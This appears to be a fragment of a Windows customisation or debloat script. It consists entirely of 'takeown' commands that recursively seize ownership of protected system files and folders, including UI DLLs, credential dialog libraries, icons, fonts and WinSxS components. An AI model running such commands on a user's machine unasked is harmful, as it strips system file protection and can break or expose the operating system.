takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\Windows.UI.SettingsHandlers-nt.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt\pris\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Windows.UI.Shell.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\Icon_MMXresume.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\LocationIcon.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\PasswordExpiry.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsCloudIcon.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\RequestedDownloadsLargeCloudIcon.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell\pris\Windows.UI.Shell.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Windows.UI.ShellCommon.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts\CoreMDL2.1.69.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts\MiraMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts\SettingsIcons.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets\AXPIcons.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts\SharMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub150x150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub71x71.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote150x150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote71x71.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\BitMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\SkypeUISymbol-Regular.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\Windows.UI.ShellCommonInetCore.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris\Windows.UI.ShellCommonInetCore.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts\BrowserMDL.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.TaskManager\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.TaskManager\Windows.UI.TaskManager.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.TaskManager\pris\Windows.UI.TaskManager.en-US.pri" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Input.Inking.Analysis.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\SysWOW64\en-US\Windows.UI.Input.Inking.dll.mui" /r /d y
takeown /f "C:\Windows\SysWOW64\WinMetadata\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\SysWOW64\WinMetadata\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\f\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\r\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\Windows.UI.TaskManager.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\f\Windows.UI.TaskManager.en-US.pri" /r /d y
